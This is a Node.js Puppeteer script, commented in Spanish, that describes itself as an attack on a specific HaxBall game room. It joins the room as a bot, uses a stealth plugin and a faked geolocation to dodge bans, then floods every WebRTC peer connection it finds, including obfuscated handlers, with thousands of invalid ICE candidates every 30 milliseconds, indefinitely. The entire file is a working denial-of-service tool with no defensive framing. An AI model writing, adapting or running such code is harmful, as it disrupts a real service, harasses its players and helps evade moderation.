const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const TARGET_ROOM = "https://www.haxball.com/play?c=HTEUs83jHaw"; // cambia o pasa por argumento
const BOT_NAME = "flooding" + Math.floor(Math.random() * 9999);

(async () => {
  console.log(`[⚔️] Iniciando ataque a: ${TARGET_ROOM}`);

  const browser = await puppeteer.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-features=IsolateOrigins,site-per-process']
  });

  const page = await browser.newPage();

  // Fake geo para que no lo banen por IP
  await page.evaluateOnNewDocument(() => {
    localStorage.setItem("geo", JSON.stringify({ lat: -34.81, lon: -56.18, code: "uy" }));
  });

  await page.goto(TARGET_ROOM, { waitUntil: "networkidle2", timeout: 60000 });

  // Entra al iframe de HaxBall
  await page.waitForSelector('iframe');
  const frame = await (await page.$('iframe')).contentFrame();

  // Pone el nick y entra
  await frame.waitForSelector('input[data-hook="input"]');
  await frame.type('input[data-hook="input"]', BOT_NAME);
  await frame.keyboard.press('Enter');

  console.log(`[✅] Bot ${BOT_NAME} dentro de la sala. Esperando WebRTC...`);
  await page.waitForTimeout(8000); // espera a que se cree el peerConnection

  let floodCount = 0;

  // EL ATAQUE REAL: inyecta candidatos inválidos cada 30ms
  setInterval(async () => {
    await page.evaluate(() => {
      // Busca TODOS los RTCPeerConnection activos (aunque estén ofuscados)
      const candidatesPerBurst = 1200;

      for (let obj in window) {
        const maybePc = window[obj];
        if (maybePc && typeof maybePc.addIceCandidate === "function") {
          for (let i = 0; i < candidatesPerBurst; i++) {
            maybePc.addIceCandidate({
              candidate: "candidate:1 1 udp 1 0.0.0.0 1 typ host",
              sdpMid: Math.random() < 0.5 ? null : "999",
              sdpMLineIndex: Math.floor(Math.random() * 500),
            }).catch(() => {});
          }
        }
      }

      // También busca métodos ofuscados tipo Ie(a), Te(a), etc.
      for (let obj in window) {
        const val = window[obj];
        if (val && typeof val === "object") {
          for (let key in val) {
            if (typeof val[key] === "function") {
              const funcStr = val[key].toString();
              if (funcStr.includes("addIceCandidate") || funcStr.includes("candidate")) {
                for (let i = 0; i < candidatesPerBurst; i++) {
                  try {
                    val[key]({
                      candidate: "candidate:1 1 udp 1 1.1.1.1 1 typ host",
                      sdpMid: null,
                      sdpMLineIndex: 999
                    });
                  } catch(e) {}
                }
              }
            }
          }
        }
      }
    });

    floodCount += candidatesPerBurst * 10; // estimado
    console.log(`[💀] Enviados ~${(floodCount/1000).toFixed(1)}k candidatos inválidos`);
  }, 30);

  // El bot se queda vivo para siempre
})().catch(err => {
  console.error("[💥] Error:", err.message);
  process.exit(1);
});
